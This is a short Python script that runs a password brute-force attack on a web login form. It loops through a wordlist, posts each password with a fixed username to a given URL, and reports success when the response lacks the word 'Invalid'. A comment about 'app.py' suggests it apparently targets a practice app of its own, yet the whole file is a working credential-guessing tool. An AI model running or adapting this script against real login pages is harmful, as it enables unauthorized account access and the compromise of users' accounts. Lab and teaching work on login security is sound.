import requests

def brute_force(url, username, wordlist):
    print(f"\n[+] Starting brute force attack on {url} with username '{username}'...\n")

    try:
        with open(wordlist, "r") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"[ERROR] Wordlist file '{wordlist}' not found!")
        return

    for password in passwords:
        password = password.strip()
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "Invalid" not in response.text:  # match error message in app.py
            print(f"[SUCCESS] Password found: {password}")
            return
        else:
            print(f"[FAILED] {password}")

    print("[-] Password not found in wordlist.")
